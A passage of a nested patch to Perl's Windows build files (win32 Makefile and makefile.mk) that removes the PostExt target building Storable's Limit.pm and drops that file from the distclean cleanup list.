+-# just need non-xs extensions
+-..\lib\Storable\Limit.pm : rebasePE Extensions_nonxs
+-	$(PLMAKE) -C ..\dist\Storable lib\Storable\Limit.pm
+-	if not exist ..\lib\Storable mkdir ..\lib\Storable
+-	copy ..\dist\Storable\lib\Storable\Limit.pm ..\lib\Storable\Limit.pm
+-
+ # all PE files need to be built by the time this target runs, PP files can still
+ # be running in parallel like UNIDATAFILES, this target a placeholder for the
+ # future
+diff --git a/win32/Makefile b/win32/Makefile
+index 481fcd8..8e7878c 100644
+--- a/win32/Makefile
++++ b/win32/Makefile
+@@ -948,7 +948,7 @@ CFG_VARS	=					\
+ #
+ 
+ all : .\config.h ..\git_version.h $(GLOBEXE) $(CONFIGPM) \
+-	$(UNIDATAFILES) MakePPPort $(PERLEXE) Extensions_nonxs Extensions PostExt \
++	$(UNIDATAFILES) MakePPPort $(PERLEXE) Extensions_nonxs Extensions \
+ 	$(PERLSTATIC)
+ 	@echo	Everything is up to date. '$(MAKE_BARE) test' to run test suite.
+ 
+@@ -1234,13 +1234,6 @@ Extensions_clean:
+ Extensions_realclean: 
+ 	-if exist $(MINIPERL) $(MINIPERL) -I..\lib ..\make_ext.pl "MAKE=$(MAKE)" --dir=$(CPANDIR) --dir=$(DISTDIR) --dir=$(EXTDIR) --all --target=realclean
+ 
+-PostExt: ..\lib\Storable\Limit.pm
+-
+-..\lib\Storable\Limit.pm: $(PERLEXE) Extensions
+-	cd ..\dist\Storable && $(MAKE) lib\Storable\Limit.pm
+-	if not exist ..\lib\Storable mkdir ..\lib\Storable
+-	copy ..\dist\Storable\lib\Storable\Limit.pm ..\lib\Storable\Limit.pm
+-
+ #-------------------------------------------------------------------------------
+ 
+ doc: $(PERLEXE) ..\pod\perltoc.pod
+@@ -1319,7 +1312,6 @@ distclean: realclean
+ 	-del /f $(LIBDIR)\Time\HiRes.pm
+ 	-del /f $(LIBDIR)\Unicode\Normalize.pm
+ 	-del /f $(LIBDIR)\Math\BigInt\FastCalc.pm
+-	-del /f $(LIBDIR)\Storable.pm $(LIBDIR)\Storable\Limit.pm
+ 	-del /f $(LIBDIR)\Win32.pm
+ 	-del /f $(LIBDIR)\Win32CORE.pm
+ 	-del /f $(LIBDIR)\Win32API\File.pm
+diff --git a/win32/makefile.mk b/win32/makefile.mk
+index 7dae753..8122c75 100644
+--- a/win32/makefile.mk
++++ b/win32/makefile.mk
+@@ -1148,7 +1148,7 @@ CFG_VARS	=					\
+ # Top targets
+ #
+ 
+-all : CHECKDMAKE rebasePE Extensions_nonxs $(PERLSTATIC) PostExt
++all : CHECKDMAKE rebasePE Extensions_nonxs $(PERLSTATIC)
+ 
+ ..\regcomp$(o) : ..\regnodes.h ..\regcharclass.h
+ 
+@@ -1572,17 +1572,6 @@ rebasePE : Extensions $(PERLDLL) $(NORMALIZE_DYN) $(PERLEXE)
+ .ENDIF
+ 	$(NOOP)
+ 
+-PostExt : ..\lib\Storable\Limit.pm
+-	$(NOOP)
+-
+-# we need the exe, perl(ver).dll, and the Exporter, Storable, Win32 extensions
+-# rebasePE most of that, including adjustment for static builds, so we
+-# just need non-xs extensions
+-..\lib\Storable\Limit.pm : rebasePE Extensions_nonxs
+-	cd ..\dist\Storable && $(MAKE) lib\Storable\Limit.pm
+-	if not exist ..\lib\Storable mkdir ..\lib\Storable
+-	copy ..\dist\Storable\lib\Storable\Limit.pm ..\lib\Storable\Limit.pm
+-
+ #-------------------------------------------------------------------------------
+ 
+ 
+@@ -1657,7 +1646,7 @@ distclean: realclean
+ 	-del /f $(LIBDIR)\Time\HiRes.pm
+ 	-del /f $(LIBDIR)\Unicode\Normalize.pm
+ 	-del /f $(LIBDIR)\Math\BigInt\FastCalc.pm
+-	-del /f $(LIBDIR)\Storable.pm $(LIBDIR)\Storable\Limit.pm
++	-del /f $(LIBDIR)\Storable.pm
+ 	-del /f $(LIBDIR)\Win32.pm
+ 	-del /f $(LIBDIR)\Win32CORE.pm
+ 	-del /f $(LIBDIR)\Win32API\File.pm
+-- 
+2.21.0
+
